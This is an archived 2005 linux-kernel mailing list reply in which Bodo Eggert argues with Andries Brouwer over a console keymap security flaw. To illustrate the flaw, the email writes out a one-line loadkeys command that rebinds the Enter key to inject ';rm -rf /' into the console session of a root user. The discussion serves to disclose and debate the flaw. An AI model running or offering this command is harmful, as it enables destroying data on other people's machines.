Return-Path: <linux-kernel-owner+willy=40w.ods.org-S1751108AbVLCFbu@vger.kernel.org>
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
	id S1751108AbVLCFbu (ORCPT <rfc822;willy@w.ods.org>);
	Sat, 3 Dec 2005 00:31:50 -0500
Received: (majordomo@vger.kernel.org) by vger.kernel.org id S1751186AbVLCFbu
	(ORCPT <rfc822;linux-kernel-outgoing>);
	Sat, 3 Dec 2005 00:31:50 -0500
Received: from mail-in-03.arcor-online.net ([151.189.21.43]:11731 "EHLO
	mail-in-03.arcor-online.net") by vger.kernel.org with ESMTP
	id S1751108AbVLCFbt (ORCPT <rfc822;linux-kernel@vger.kernel.org>);
	Sat, 3 Dec 2005 00:31:49 -0500
Date: Sat, 3 Dec 2005 06:33:51 +0100 (CET)
From: Bodo Eggert <7eggert@gmx.de>
To: Andries Brouwer <Andries.Brouwer@cwi.nl>
cc: Bodo Eggert <7eggert@gmx.de>, linux-kernel@vger.kernel.org, akpm@osdl.org,
       horms@verge.net.au
Subject: Re: security / kbd
In-Reply-To: <20051203023946.GC24760@apps.cwi.nl>
Message-ID: <Pine.LNX.4.58.0512030616230.6684@be1.lrz>
References: <5f6Fp-1ZB-11@gated-at.bofh.it> <E1EiLA5-0001VE-64@be1.lrz>
 <20051203013455.GB24760@apps.cwi.nl> <Pine.LNX.4.58.0512030251570.6039@be1.lrz>
 <20051203023946.GC24760@apps.cwi.nl>
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII
X-be10.7eggert.dyndns.org-MailScanner-Information: See www.mailscanner.info for information
X-be10.7eggert.dyndns.org-MailScanner: Found to be clean
X-be10.7eggert.dyndns.org-MailScanner-From: 7eggert@web.de
Sender: linux-kernel-owner@vger.kernel.org
X-Mailing-List: linux-kernel@vger.kernel.org

On Sat, 3 Dec 2005, Andries Brouwer wrote:
> On Sat, Dec 03, 2005 at 03:11:42AM +0100, Bodo Eggert wrote:
> > On Sat, 3 Dec 2005, Andries Brouwer wrote:

> > > Let me repeat what I said and you snipped:
> > > If there is a security problem, then it should be solved in user space.
> > 
> > By killing and disabeling all remote logins when root logs in or by 
> > ptracing each user program during root sessions? You'd have to do this 
> > until we find somebody to do the correct fix in the kernel.
> 
> Please describe the perceived security problem.
> I see words, but no problem.

> You log in remotely to my machine. Want to do something evil.
> What precisely do you do?

echo -e 'keycode 28 F70
         string  F70 ";rm -rf /\x0a"' | loadkeys > /proc/0815/fd/1

where process 0815 is a "sleep 2147483647&"

> 2.0.34% loadkeys -d
> Couldnt get a file descriptor referring to the console

I had stale permissions on /dev/tty0. With correct permission settings, 
you'll need a session belonging to the malicious user.

-- 
'Calm down -- it's only ones and zeros.' 
